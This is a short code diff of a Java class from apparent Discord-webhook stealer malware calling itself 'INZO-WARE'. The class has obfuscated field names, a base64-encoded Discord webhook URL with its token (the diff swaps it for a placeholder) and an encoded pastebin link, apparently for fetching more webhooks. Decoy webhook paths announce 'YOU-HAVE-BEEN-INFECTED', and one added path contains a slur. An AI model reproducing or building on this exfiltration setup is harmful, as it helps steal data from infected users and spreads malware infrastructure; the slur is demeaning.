@@ -12,10 +12,9 @@ import javax.net.ssl.HttpsURLConnection;
 
 public class Hooks374 {
 
-	
 	public static ArrayList<String> realHooks = new ArrayList<>();
 	public static ArrayList<String> INZOWEBHOOK = new ArrayList<String>();
-	public static String lIIlIlIll = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTI2OTE3NTc2NDI3MTk2NDY2L3pSNl9veVZJNXdOVldBdHNSZ1FMSWNwRTE0a2hSUnA5MmxSV3JucHJET0lTZlZoaTAxTFp6U1Y2R3RQNXlSS2dVT3Bn"; // discord webhoook url encoded in base64
+	public static String lIIlIlIll = "webhook"; // discord webhoook url encoded in base64
 	public static String IIllIlIll = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0RVYjBIM3R1"; // pastebin url encoded in base64
 
 	public static String getyou() {
@@ -51,7 +50,7 @@ public class Hooks374 {
 		}
 		realHooks.add("https://discord.com/api/webhooks/INZO-WARE/YOU-HAVE-BEEN-INFECTED");
 		realHooks.add("https://discord.com/api/webhooks/INZO-WARE/INJECTION-COMPLETED");
-		realHooks.add("https://discord.com/api/webhooks/INZO-WARE/YOU-HAVENT-OF-TRIED-TO-DECOMPILE-THIS");
+		realHooks.add("https://discord.com/api/webhooks/INZO-WARE/UR-RETARDED");
 		Random r = new Random();
 		int picked = r.nextInt(INZOWEBHOOK.size());
 		String InzoItem = INZOWEBHOOK.get(picked);
